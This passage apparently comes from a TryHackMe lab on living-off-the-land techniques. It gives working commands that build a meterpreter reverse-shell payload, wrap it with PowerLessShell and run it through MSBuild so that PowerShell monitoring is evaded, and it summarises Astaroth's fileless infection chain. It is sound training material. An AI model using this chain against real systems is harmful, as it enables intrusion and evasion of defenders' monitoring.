+<p>No PowerShell!</p>
+<p>In 2019, Red Canary published a threat detection report stating that PowerShell is the most used technique for malicious activities. Therefore, Organizations started to monitor or block&nbsp;powershell.exe&nbsp;from being executed. As a result, adversaries find other ways to run PowerShell code without spawning it.</p>
+<figure class="image image_resized" style="width:381px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/239e633cdb273be86d1077949539cb38.png"></figure>
+<p>PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.</p>
+<p>First, let's download a copy of the project from the GitHub repo onto the AttackBox:</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git</code></pre>
+<p>One of the project requirements is to get a PowerShell payload to make it suitable to work with MSBuild. On the AttackBox, we need to generate a&nbsp;PowerShell&nbsp;payload using&nbsp;msfvenom&nbsp;as follows:&nbsp;</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection &gt; liv0ff.ps1</code></pre>
+<p>Also, we need to run the Metasploit framework to listen and wait for the reverse shell.</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+payload =&gt; windows/meterpreter/reverse_winhttps
+lhost =&gt; AttackBox_IP lport =&gt; 4443
+[*] Started HTTPS reverse handler on https://AttackBox_IP:4443</code></pre>
+<p>Now that we have the payload ready, change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run the PowerLessShell tool and set the source file to the one we created with msfvenom as follows:</p>
+<p>Terminal</p>
+<pre><code class="language-plaintext">user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj</code></pre>
+<p>Once the command is executed successfully, we need to transfer the output file to the Windows machine. You can do this using the&nbsp;SCP&nbsp;command or set a web server to host the file on the AttackBox (python3 -m http.server 1337) and download the file using the browser.</p>
+<p>Finally, on the target Windows machine, build the&nbsp;.csproj&nbsp;file and wait for the reverse shell!</p>
+<p>Command Prompt!</p>
+<pre><code class="language-plaintext">C:\Users\thm&gt; c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj</code></pre>
+<p>Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell.&nbsp;Note that&nbsp;there will be no&nbsp;powershell.exe&nbsp;process is running.</p>
+<h1>Real-life Scenario</h1>
+<p>This task introduces a showcase of malware that used the techniques discussed in this room.</p>
+<p>In 2017, The Windows Defender Advanced Threat Protection (<a href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/">Windows Defender ATP</a>) Research Team discovered Fileless malware named <strong>Astaroth</strong>. A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device's memory.</p>
+<p><strong>Astaroth </strong>is known as an<strong> information stealer</strong>, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker.&nbsp;The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries to perform different functions.&nbsp;</p>
+<p>In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files.&nbsp;The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following:</p>
+<ul>
+  <li>A <strong>WMIC</strong> command is executed to download and run Javascript code.</li>
+  <li>Abusing the <strong>BITSadmin </strong>to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their C2 server commands.</li>
+  <li>Using the&nbsp;BITSadmin, ADS technique, to hide their binaries within the system for their persistence.</li>
+  <li>A <strong>Certutil&nbsp;</strong>tool is used to decode a couple of downloaded payloads into DLL files.</li>
+  <li>The DLL files are executed using <strong>Regsvr32</strong>.</li>
+</ul>
+<p>For more details about the malware and the detections, we suggest checking the following references:</p>
+<ol>
+  <li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a></li>
+  <li><a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer">Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer</a></li>
+  <li><a href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/">Astaroth malware hides command servers in YouTube channel descriptions</a></li>
+</ol>
+<h1>Conclusion</h1>
+<p>In this room, we covered the general concept of <strong>Living Off the Land&nbsp;</strong>as well as went through some of the examples seen and used during red team engagements. The Living Off the Land techniques can be used for various purposes, including reconnaissance, file operations, execution binaries, and persistence and bypass security measures.&nbsp;</p>
+<p><strong>Additional resources</strong></p>
+<ul>
+  <li><a href="https://gtfobins.github.io/">GTFOBins</a>&nbsp;- The Linux version of the LOLBAS project.</li>
+  <li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan</a>&nbsp;- A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.</li>
+</ul>
+<p>&nbsp;</p>
